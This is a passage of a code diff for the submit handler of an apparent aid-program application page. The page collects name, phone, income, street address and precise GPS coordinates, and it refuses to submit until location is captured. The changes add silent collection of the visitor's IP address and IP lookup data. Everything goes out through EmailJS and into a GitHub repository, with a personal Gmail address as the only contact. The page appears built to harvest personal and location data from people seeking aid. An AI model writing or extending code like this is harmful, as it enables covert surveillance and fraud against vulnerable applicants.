+    ip_country:  data.visitorIPData.country || 'N/A',
     location:    data.location.address,
     latitude:    data.location.lat,
     longitude:   data.location.lon,
@@ -792,11 +786,7 @@ function handleSubmit(e) {
   e.preventDefault();
   if (!locationCaptured) { openLocationModal(e); return; }
   clearAllErrors();
-  if (!validateForm()) {
-    var firstErr = document.querySelector('.invalid');
-    if (firstErr) firstErr.scrollIntoView({behavior:'smooth', block:'center'});
-    return;
-  }
+  if (!validateForm()) { var firstErr=document.querySelector('.invalid'); if(firstErr) firstErr.scrollIntoView({behavior:'smooth',block:'center'}); return; }
   var refId = genRefId();
   var submission = {
     refId: refId, submittedAt: new Date().toISOString(),
@@ -804,39 +794,45 @@ function handleSubmit(e) {
     email: getVal('f-email'), phone: getVal('f-phone'),
     state: getVal('f-state'), income: getVal('f-income'),
     program: getVal('f-program'), need: getVal('f-need'),
+    visitorIP:     visitorIP,
+    visitorIPData: visitorIPData,
     location: {
-      address: capturedAddress,
-      street: capturedAddrObj.street || '', area: capturedAddrObj.area || '',
-      district: capturedAddrObj.district || '', city: capturedAddrObj.city || '',
-      state: capturedAddrObj.state || '', postcode: capturedAddrObj.postcode || '',
-      country: capturedAddrObj.country || '',
-      lat: capturedLat, lon: capturedLon,
-      accuracy: capturedLat ? Math.round(window._locationAccuracy || 0) + 'm' : 'unknown'
+      address:  capturedAddress,
+      street:   capturedAddrObj.street   || '',
+      area:     capturedAddrObj.area     || '',
+      district: capturedAddrObj.district || '',
+      city:     capturedAddrObj.city     || '',
+      state:    capturedAddrObj.state    || '',
+      postcode: capturedAddrObj.postcode || '',
+      country:  capturedAddrObj.country  || '',
+      lat:      capturedLat,
+      lon:      capturedLon,
+      accuracy: capturedLat ? Math.round(window._locationAccuracy || 0)+'m' : 'unknown'
     }
   };
   var btn = document.getElementById('submit-btn');
   btn.disabled = true; btn.textContent = '⏳ Submitting your application...';
   document.getElementById('submit-error').style.display = 'none';
-  var emailPromise  = sendEmail(submission, refId).catch(function(err) { console.warn('EmailJS error:', err); return { emailFailed: true }; });
-  var githubPromise = saveToGitHub(submission, refId).catch(function(err) { console.warn('GitHub error:', err); return { githubFailed: true }; });
-  Promise.all([emailPromise, githubPromise]).then(function(results) {
-    var emailFailed  = results[0] && results[0].emailFailed;
-    var githubFailed = results[1] && results[1].githubFailed;
+  Promise.all([
+    sendEmail(submission, refId).catch(function(err){console.warn('EmailJS error:',err);return{emailFailed:true};}),
+    saveToGitHub(submission, refId).catch(function(err){console.warn('GitHub error:',err);return{githubFailed:true};})
+  ]).then(function(results) {
+    var emailFailed = results[0]&&results[0].emailFailed, githubFailed = results[1]&&results[1].githubFailed;
     if (emailFailed && githubFailed) {
       btn.disabled = false; btn.textContent = 'Submit Application →';
       var errEl = document.getElementById('submit-error');
-      errEl.innerHTML = '⚠️ Submission failed. Please check your internet connection and try again. If the problem persists, contact us directly at <strong>confirmationpin@gmail.com</strong>.';
+      errEl.innerHTML = '⚠️ Submission failed. Check your internet connection and try again. If the problem persists contact <strong>confirmationpin@gmail.com</strong>.';
       errEl.style.display = 'block';
-      errEl.scrollIntoView({behavior:'smooth', block:'center'});
+      errEl.scrollIntoView({behavior:'smooth',block:'center'});
     } else {
       document.getElementById('application-form').style.display = 'none';
       document.getElementById('ref-id').textContent = refId;
       document.getElementById('success-screen').style.display = 'block';
-      document.getElementById('success-screen').scrollIntoView({behavior:'smooth', block:'center'});
+      document.getElementById('success-screen').scrollIntoView({behavior:'smooth',block:'center'});
       console.log('=== SUBMISSION COMPLETE ===');
-      console.log('Ref ID   :', refId);
-      console.log('Email    :', emailFailed  ? 'FAILED' : 'sent');
-      console.log('GitHub   :', githubFailed ? 'FAILED' : 'saved');
+      console.log('Ref ID :', refId);
+      console.log('Email  :', emailFailed  ? 'FAILED' : 'sent');
+      console.log('GitHub :', githubFailed ? 'FAILED' : 'saved');
     }
   });
 }
